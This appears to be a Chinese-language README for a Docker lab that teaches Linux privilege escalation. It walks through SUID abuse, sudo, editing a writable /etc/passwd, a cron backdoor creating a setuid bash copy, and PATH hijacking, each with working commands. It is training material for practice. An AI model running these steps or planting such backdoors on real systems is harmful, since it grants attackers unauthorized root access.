# linux-elevate-hub
适用于linux提权的练习靶场（非系统漏洞提权）


## 构建镜像
```
docker build -t linux_elevate .
```
## 启动容器
```
docker run -d -p 10022:22 linux_elevate
```
## 演示
### 登陆普通用户ssh
> 用户名：zhangsan / 密码：123456
```
ssh zhangsan@127.0.0.1 -p10022
```
### 0x1. suid 提权
1. 搜索suid权限的文件
```
find / -perm -u=s -type f 2>/dev/null
```
<img width="713" alt="image" src="https://github.com/user-attachments/assets/623f6c84-99aa-4785-9fe0-ff7144f3bb5e">

2. 使用find命令进行 suid 提权
参考：https://gtfobins.github.io
```
find . -exec /bin/sh -p \; -quit
```
<img width="880" alt="image" src="https://github.com/user-attachments/assets/2499a2a7-cb50-4687-ba21-7777ff1f607a">

### 0x2. sudo 提权
1. 查看当前用户的sudo权限
```
sudo -l
```
<img width="1419" alt="image" src="https://github.com/user-attachments/assets/aaf6ff9f-7101-470c-8c14-98bb188bb716">

2. sudo 提权
```
sudo bash
```

### 0x3. 配置错误提权
#### 用户文件权限配置错误
> emmmm 这种提权就很迷
1. 查看 `/etc/passwd` 文件权限
```
ls -l /etc/passwd 
```
发现所有用户对 /etc/passwd 可写

2. 生成一个密码hash
```
openssl passwd -1 -salt mysalt password

$1$mysalt$4Lz7hS.y2V54mV2gJXEKR/
```
3. 编辑 /etc/passwd 替换 root 密码
<img width="778" alt="image" src="https://github.com/user-attachments/assets/4a829fd1-876c-400a-bb50-e29a9fb543e4">

4. 切换到root用户


#### 计划任务文件权限配置错误
> emmmm 这种提权就很迷
1. 查看 `/etc/crontab` 文件权限
```
ls -l /etc/crontab 
```
发现所有用户对 /etc/crontab 可写
2. 创建 /tmp/1.sh 并写入命令
```
cp /bin/bash /tmp/bash666;chmod u+s /tmp/bash666
```
3. 在 /etc/crontab 里写入后门计划任务
```
echo "*/1 * * * * root /tmp/1.sh" >> /etc/crontab
```
4. 运行 /tmp/bash666
```
./bash666 -p
```
   
### 0x4.环境变量提权
1. 搜索suid权限的文件
```
find / -perm -u=s -type f 2>/dev/null
```
<img width="713" alt="image" src="https://github.com/user-attachments/assets/623f6c84-99aa-4785-9fe0-ff7144f3bb5e">

2. 运行shell文件 ，发现输出疑似 `ps` 命令的结果
3. 创建一个新的ps文件，内容为 /bin/bash，最后修改环境变量
```
cd /tmp
echo "/bin/bash" > ps
chmod u+x ps
export PATH=/tmp:$PATH
```
4. 再次运行shell文件，成功提权
<img width="766" alt="image" src="https://github.com/user-attachments/assets/a95e1a72-e29f-4dea-a1b4-752be58de500">
